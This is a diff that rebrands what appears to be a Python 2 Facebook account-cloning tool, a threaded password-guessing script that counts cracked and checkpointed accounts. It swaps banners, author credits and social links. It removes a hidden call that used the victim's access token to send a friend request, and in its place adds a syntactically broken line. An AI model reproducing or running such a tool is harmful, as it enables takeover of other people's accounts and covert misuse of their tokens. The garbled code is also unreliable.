@@ -48,18 +48,18 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;98m   
-\033[1;98m╱╱╭┳━━━┳━╮╱╭┳╮╱╭╮
-\033[1;98m╱╱┃┃╭━╮┃┃╰╮┃┃┃╱┃┃
-\033[1;98m╱╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
-\033[1;98m╭╮┃┃╰━╯┃┃╰╮┃┃┃╱┃┃
-\033[1;98m┃╰╯┃╭━╮┃┃╱┃┃┃╰━╯┃
-\033[1;98m╰━━┻╯╱╰┻╯╱╰━┻━━━╯​​​​
-\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
-\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  Ⲙꞅ.ⴑ𝛓ⲁⲙⲁ Ⲁꞅⲁⲓⲛ              ║    
-\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ 𝖀𝖘𝖆𝖒𝖆 𝕿𝖗𝖎𝖈𝖐𝖊𝖗            ║  
-\033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊  ║
-\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
+╔╗─╔╗─────────╔╗──╔╗
+║║─║║─────────║║──║║
+║║╔╣╚═╦══╦═╗╔═╝╠══╣║╔╦══╦═╗
+║╚╝╣╔╗║╔╗║╔╗╣╔╗║╔╗║╚╝╣╔╗║╔╝
+║╔╗╣║║║╚╝║║║║╚╝║╚╝║╔╗╣╔╗║║
+╚╝╚╩╝╚╩══╩╝╚╩══╩══╩╝╚╩╝╚╩╝
+
+\033[1;91m    ║══▒═🌺═▒═🌺═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
+\033[1;96m    ║✯Facebook:Khondokar.Imran273 ║    
+\033[1;98m    ║✯ Instagram :Khondokar_Imran          ║  
+\033[1;96m    ║✯ �Facebook page:https://www.facebook.com/khondokar_imra-111546267243057/ ║
+\033[1;91m    ║══▒═💙═▒═💚═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -78,28 +78,37 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;97m************************************************
-\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR 𝖀𝖘𝖆𝖒𝖆~
+\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE Khondokar Imran
 \033[1;97m************************************************
 
-\033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
-\033[1;95m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
-\033[1;95m____─█──███▄▄███▄▄███──█─ 
-\033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
-\033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
+
+█████████████████████████████████████████████████████████████████████
+█▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
+█▒▒▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+█▒▒▒▒▄▀▒▒▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+███▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒████▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█
+███▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+███▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+███▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+███▒▒▄▀▒▒███▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█████▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▒▒▄▀▒▒▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█
+█████████████████████████████████████████████████████████████████████
 """
-jalan("\033[1;92m              _    _     _ ")             
-jalan("\033[1;92m             | |  (_)   | |")             
-jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  ZINDABAD✔ ") 
-jalan("\033[1;97m | '_ \ / _` | |/ / / __| __/ _` | '_ \ ")
-jalan("\033[1;97m | |_) | (_| |   <| \__ \ || (_| | | | |")
-jalan("\033[1;92m | .__/ \__,_|_|\_\_|___/\__\__,_|_| |_|")
-jalan("\033[1;92m | | ")                                   
-jalan("\033[1;92m |_| ")
+
+██╗███╗░░░███╗██████╗░░█████╗░███╗░░██╗
+██║████╗░████║██╔══██╗██╔══██╗████╗░██║
+██║██╔████╔██║██████╔╝███████║██╔██╗██║
+██║██║╚██╔╝██║██╔══██╗██╔══██║██║╚████║
+██║██║░╚═╝░██║██║░░██║██║░░██║██║░╚███║
+╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
 
 
 
-CorrectUsername = "Joker"
-CorrectPassword = "Joker"
+
+CorrectUsername = "Imran"
+CorrectPassword = "imran"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -111,10 +120,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCyo6dFjHh_I1ftQ-a0Is2Aw')
+            os.system('xdg-open https://www.facebook.com/Khondokar.Imran273')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCyo6dFjHh_I1ftQ-a0Is2Aw')
+        os.system('xdg-open https://www.facebook.com/Khondokar.Imran273')
 
 def login():
 	os.system('clear')
@@ -155,8 +164,8 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCyo6dFjHh_I1ftQ-a0Is2Aw')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://www.facebook.com/Khondokar.Imran273')
+				https://www.facebook.com/Khondokar.Imran273')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
@@ -296,6 +305,7 @@ def pilih_super():
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
+	
 
 	jalan('           \033[1;91m start cloning Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
@@ -516,8 +526,8 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackLover\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By Usama TrickerTricker YT--•◈•---»" #Dev:Rana
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Joker.py)↩\033[1;97m....'
+	print "  \033[1;91m«---•◈•---Developed By Khondokar Imran YT--•◈•---»" #Dev:Imran
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Khondokar.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  ____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
